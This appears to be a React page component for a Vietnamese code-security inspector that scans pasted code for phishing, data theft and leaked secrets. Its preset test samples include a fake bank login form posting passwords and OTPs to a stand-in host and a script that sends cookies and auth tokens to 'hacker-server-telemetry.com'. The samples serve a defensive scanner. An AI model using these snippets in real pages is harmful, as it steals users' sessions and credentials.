import React, { useState } from 'react';
import { 
  Code2, 
  Terminal, 
  ShieldAlert, 
  AlertTriangle, 
  CheckCircle2, 
  FileCode2, 
  Lock, 
  Globe, 
  Bug, 
  Key, 
  Eye, 
  Sparkles,
  ArrowRight,
  ShieldCheck
} from 'lucide-react';
import { AiVerificationService } from '../services/aiService';
import { CodeInspectionReport } from '../types';

export const InspectorPage: React.FC = () => {
  const [inputCode, setInputCode] = useState('');
  const [report, setReport] = useState<CodeInspectionReport | null>(null);
  const [isScanning, setIsScanning] = useState(false);

  // Preset code examples for instant testing by students and developers
  const sampleSnippets = [
    {
      title: 'HTML Phishing Form',
      lang: 'HTML',
      code: `<form action="http://fake-banking-login.xyz/collect.php" method="POST">\n  <h2>Đăng nhập Internet Banking</h2>\n  <input type="text" name="username" placeholder="Tên đăng nhập">\n  <input type="password" name="password" placeholder="Mật khẩu">\n  <input type="text" name="otp" placeholder="Nhập mã OTP ngân hàng">\n  <button type="submit">Xác nhận</button>\n</form>`
    },
    {
      title: 'JS Cookie Stealer',
      lang: 'JavaScript',
      code: `// Script thu thập phiên người dùng\nconst userToken = localStorage.getItem("auth_token");\nconst userCookies = document.cookie;\nfetch("http://hacker-server-telemetry.com/exfiltrate", {\n  method: "POST",\n  body: JSON.stringify({ token: userToken, cookies: userCookies })\n});\nwindow.location.replace("https://google.com");`
    },
    {
      title: 'Python API Key Leak',
      lang: 'Python',
      code: `import os\nimport requests\n\n# Lộ API key bí mật trong code\nOPENAI_API_KEY = "MOCK_EXEMPLARY_API_KEY_NEVER_HARDCODE_SECRET"\nadmin_password = "super_secret_admin_pass_2026"\n\ndef send_data():\n    headers = {"Authorization": f"Bearer {OPENAI_API_KEY}"}\n    return requests.get("https://api.openai.com/v1/models", headers=headers)`
    },
    {
      title: 'Mã JavaScript An Toàn',
      lang: 'JavaScript',
      code: `// Tính tổng và kiểm tra số nguyên tố an toàn\nfunction isPrime(num) {\n  if (num <= 1) return false;\n  for (let i = 2; i <= Math.sqrt(num); i++) {\n    if (num % i === 0) return false;\n  }\n  return true;\n}\n\nconsole.log(isPrime(17)); // Output: true`
    }
  ];

  const handleInspect = () => {
    if (!inputCode.trim()) return;
    setIsScanning(true);
    setTimeout(() => {
      const res = AiVerificationService.inspectContentOrCode(inputCode);
      setReport(res);
      setIsScanning(false);
    }, 700);
  };

  const handleSelectSample = (sample: typeof sampleSnippets[0]) => {
    setInputCode(sample.code);
    setReport(null);
  };

  return (
    <div className="space-y-6 pb-20 md:pb-8">
      
      {/* Header Banner */}
      <section className="glass-panel rounded-3xl p-6 relative overflow-hidden">
        <div className="absolute top-0 right-0 w-80 h-80 bg-gradient-to-bl from-cyan-500/15 via-indigo-500/10 to-transparent rounded-full blur-3xl pointer-events-none" />

        <div className="max-w-2xl">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 text-xs font-bold uppercase tracking-wider mb-2">
            <Terminal className="w-4 h-4" />
            <span>AI Content & Security Inspector</span>
          </div>

          <h1 className="text-2xl md:text-3xl font-extrabold text-white">
            Thanh Tra Nội Dung & Mã Nguồn
          </h1>
          <p className="text-xs md:text-sm text-slate-300 mt-2 leading-relaxed">
            Dán một đoạn code HTML, JavaScript, Python, JSON hoặc nội dung từ website bạn nghi ngờ.
            AI sẽ tự động nhận diện ngôn ngữ, phân tích lỗi, quét backdoor, hành vi thu thập dữ liệu bí mật và phát hiện nguy cơ bảo mật.
          </p>
        </div>

        {/* Quick Sample Buttons */}
        <div className="mt-5 space-y-1.5">
          <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">
            Chọn mã nguồn mẫu để thử nghiệm:
          </span>
          <div className="flex flex-wrap gap-2">
            {sampleSnippets.map((s, idx) => (
              <button
                key={idx}
                onClick={() => handleSelectSample(s)}
                className="px-3 py-1.5 rounded-xl text-xs bg-slate-900/90 hover:bg-slate-800 border border-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5"
              >
                <Code2 className="w-3.5 h-3.5 text-cyan-400" />
                <span>{s.title} ({s.lang})</span>
              </button>
            ))}
          </div>
        </div>

      </section>

      {/* Editor & Scanner Input */}
      <section className="glass-panel rounded-3xl p-5 md:p-6 space-y-4">
        
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 text-xs font-bold text-slate-300">
            <FileCode2 className="w-4 h-4 text-indigo-400" />
            <span>Ô nhập liệu mã nguồn hoặc nội dung:</span>
          </div>
          <span className="text-[11px] text-slate-500 font-mono">
            Hỗ trợ: HTML, JS, Python, JSON, Plaintext
          </span>
        </div>

        {/* Code Input Area with Terminal look */}
        <div className="relative rounded-2xl overflow-hidden border border-slate-800 bg-slate-950">
          <div className="flex items-center justify-between px-4 py-2 bg-slate-900/80 border-b border-slate-800 text-xs font-mono text-slate-400">
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-rose-500/80" />
              <span className="w-2.5 h-2.5 rounded-full bg-amber-500/80" />
              <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
              <span className="ml-2 text-slate-500">trustnet_inspector_sandbox.sh</span>
            </div>
            <button 
              onClick={() => setInputCode('')}
              className="text-[10px] text-slate-400 hover:text-white"
            >
              Xóa ô nhập
            </button>
          </div>

          <textarea
            value={inputCode}
            onChange={(e) => setInputCode(e.target.value)}
            placeholder="<DÁN NỘI DUNG HOẶC MÃ NGUỒN VÀO ĐÂY>"
            rows={8}
            className="w-full px-4 py-3 bg-slate-950 text-slate-100 font-mono text-xs md:text-sm placeholder:text-slate-600 focus:outline-none resize-none leading-relaxed"
          />
        </div>

        {/* Action Button */}
        <div className="flex items-center justify-between pt-1">
          <div className="text-xs text-slate-500 flex items-center gap-1.5">
            <Lock className="w-3.5 h-3.5 text-emerald-400" />
            <span>Mã được phân tích trong môi trường cô lập (Sandbox an toàn)</span>
          </div>

          <button
            onClick={handleInspect}
            disabled={!inputCode.trim() || isScanning}
            className="flex items-center gap-2 px-6 py-2.5 rounded-2xl bg-gradient-to-r from-cyan-600 to-indigo-600 hover:from-cyan-500 hover:to-indigo-500 disabled:opacity-50 text-white font-extrabold text-xs md:text-sm shadow-glow-sm hover:shadow-glow-cyan transition-all"
          >
            {isScanning ? (
              <>
                <Sparkles className="w-4 h-4 animate-spin text-cyan-300" />
                <span>Đang thanh tra mã...</span>
              </>
            ) : (
              <>
                <Terminal className="w-4 h-4" />
                <span>🤖 Phân tích ngay</span>
              </>
            )}
          </button>
        </div>

      </section>

      {/* Inspection Report Section */}
      {report && (
        <section className="glass-panel rounded-3xl p-6 md:p-8 space-y-6 animate-in zoom-in-95 duration-200">
          
          {/* Top Status Header */}
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-slate-800">
            
            <div>
              <div className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2 mb-1">
                <span>Ngôn ngữ nhận diện:</span>
                <span className="px-2 py-0.5 rounded-md bg-indigo-500/20 text-indigo-300 border border-indigo-500/30 font-mono">
                  {report.detectedType}
                </span>
              </div>
              <h2 className="text-xl md:text-2xl font-black text-white">
                {report.riskLevel === 'rat_nguy_hiem' || report.riskLevel === 'nguy_hiem' ? (
                  <span className="text-rose-400 flex items-center gap-2">
                    <ShieldAlert className="w-6 h-6" />
                    🔴 Phát hiện vấn đề bảo mật nghiêm trọng
                  </span>
                ) : report.riskLevel === 'chu_y' ? (
                  <span className="text-amber-400 flex items-center gap-2">
                    <AlertTriangle className="w-6 h-6" />
                    🟠 Cần chú ý: Phát hiện dấu hiệu bất thường
                  </span>
                ) : (
                  <span className="text-emerald-400 flex items-center gap-2">
                    <ShieldCheck className="w-6 h-6" />
                    🟢 Đoạn mã / nội dung có cấu trúc an toàn
                  </span>
                )}
              </h2>
            </div>

            {/* Risk Gauge */}
            <div className="flex items-center gap-4 bg-slate-900 p-3.5 rounded-2xl border border-slate-800">
              <div className="text-center pr-3 border-r border-slate-800">
                <span className="text-[10px] uppercase font-bold text-slate-400 block">Chỉ số rủi ro</span>
                <span className={`text-2xl font-black font-mono ${
                  report.riskScore >= 70 ? 'text-rose-400' :
                  report.riskScore >= 40 ? 'text-amber-400' : 'text-emerald-400'
                }`}>
                  {report.riskScore}<span className="text-xs font-normal text-slate-500">/100</span>
                </span>
              </div>
              <div className="text-xs font-bold">
                {report.riskLevel === 'rat_nguy_hiem' && <span className="text-rose-400">RẤT NGUY HIỂM</span>}
                {report.riskLevel === 'nguy_hiem' && <span className="text-rose-300">NGUY HIỂM</span>}
                {report.riskLevel === 'chu_y' && <span className="text-amber-400">CẢNH GIÁC</span>}
                {report.riskLevel === 'an_toan' && <span className="text-emerald-400">AN TOÀN</span>}
              </div>
            </div>

          </div>

          {/* AI Explanation Paragraph in Plain Vietnamese */}
          <div className="p-4 rounded-2xl bg-slate-950/80 border border-slate-800 text-xs md:text-sm text-slate-200 space-y-1">
            <span className="font-bold text-cyan-300 block mb-1">🤖 Đánh giá từ AI Inspector:</span>
            <p className="leading-relaxed">{report.explanation}</p>
          </div>

          {/* 4 Threat Signal Check Indicators */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            
            <div className={`p-3 rounded-2xl border flex flex-col justify-between ${
              report.hasDataHarvesting 
                ? 'bg-rose-950/20 border-rose-500/40 text-rose-300' 
                : 'bg-slate-950/50 border-slate-800 text-slate-400'
            }`}>
              <div className="flex items-center justify-between">
                <Eye className="w-4 h-4" />
                <span className="text-[10px] font-bold">{report.hasDataHarvesting ? 'CÓ' : 'KHÔNG'}</span>
              </div>
              <span className="text-xs font-semibold mt-2">Thu thập dữ liệu</span>
            </div>

            <div className={`p-3 rounded-2xl border flex flex-col justify-between ${
              report.hasSuspiciousRedirect 
                ? 'bg-rose-950/20 border-rose-500/40 text-rose-300' 
                : 'bg-slate-950/50 border-slate-800 text-slate-400'
            }`}>
              <div className="flex items-center justify-between">
                <Globe className="w-4 h-4" />
                <span className="text-[10px] font-bold">{report.hasSuspiciousRedirect ? 'CÓ' : 'KHÔNG'}</span>
              </div>
              <span className="text-xs font-semibold mt-2">Chuyển hướng lạ</span>
            </div>

            <div className={`p-3 rounded-2xl border flex flex-col justify-between ${
              report.hasSecretLeak 
                ? 'bg-rose-950/20 border-rose-500/40 text-rose-300' 
                : 'bg-slate-950/50 border-slate-800 text-slate-400'
            }`}>
              <div className="flex items-center justify-between">
                <Key className="w-4 h-4" />
                <span className="text-[10px] font-bold">{report.hasSecretLeak ? 'CÓ' : 'KHÔNG'}</span>
              </div>
              <span className="text-xs font-semibold mt-2">Lộ API Key / Bí mật</span>
            </div>

            <div className={`p-3 rounded-2xl border flex flex-col justify-between ${
              report.hasPhishingSignals 
                ? 'bg-rose-950/20 border-rose-500/40 text-rose-300' 
                : 'bg-slate-950/50 border-slate-800 text-slate-400'
            }`}>
              <div className="flex items-center justify-between">
                <Bug className="w-4 h-4" />
                <span className="text-[10px] font-bold">{report.hasPhishingSignals ? 'CÓ' : 'KHÔNG'}</span>
              </div>
              <span className="text-xs font-semibold mt-2">Dấu hiệu Phishing</span>
            </div>

          </div>

          {/* Detailed Vulnerability Issues List */}
          {report.issues.length > 0 && (
            <div className="space-y-3">
              <h3 className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                Chi tiết các lỗ hổng phát hiện ({report.issues.length}):
              </h3>
              <div className="space-y-2.5">
                {report.issues.map((issue, idx) => (
                  <div key={idx} className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2 text-xs">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-rose-400 flex items-center gap-1.5">
                        <AlertTriangle className="w-4 h-4" />
                        {issue.type}
                      </span>
                      <span className="px-2 py-0.5 rounded-full bg-rose-500/10 text-rose-400 border border-rose-500/20 text-[10px] uppercase font-bold">
                        {issue.severity}
                      </span>
                    </div>

                    <p className="text-slate-300">{issue.description}</p>

                    {issue.codeSnippet && (
                      <div className="p-2 rounded-xl bg-slate-900 border border-slate-800 font-mono text-[11px] text-amber-300">
                        Phát hiện tại: {issue.codeSnippet}
                      </div>
                    )}

                    <div className="text-slate-400 pt-1">
                      <span className="text-indigo-400 font-semibold">Khắc phục khuyến nghị: </span>
                      {issue.remedy}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Recommendation Box */}
          <div className="p-4 rounded-2xl bg-slate-900 border border-indigo-500/30 text-xs md:text-sm text-slate-200">
            <span className="font-bold text-indigo-400">💡 Lời khuyên hành động: </span>
            {report.recommendation}
          </div>

        </section>
      )}

    </div>
  );
};
